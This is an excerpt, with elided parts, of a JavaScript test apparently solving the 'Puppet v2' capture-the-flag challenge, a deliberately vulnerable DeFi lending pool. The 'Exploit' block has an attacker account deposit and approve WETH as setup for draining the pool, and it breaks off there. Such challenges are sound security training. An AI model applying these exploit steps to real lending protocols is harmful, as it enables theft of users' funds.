...
describe("[Challenge] Puppet v2", function () {
  ...
  it("Exploit", async function () {
    ...
    const depositValue = await this.lendingPool.calculateDepositOfWETHRequired(
      POOL_INITIAL_TOKEN_BALANCE
    );

    await this.weth
      .connect(attacker)
      .deposit({ value: depositValue, gasLimit: 1e6 });
    await this.weth
      .connect(attacker)
      .approve(this.lendingPool.address, depositValue);
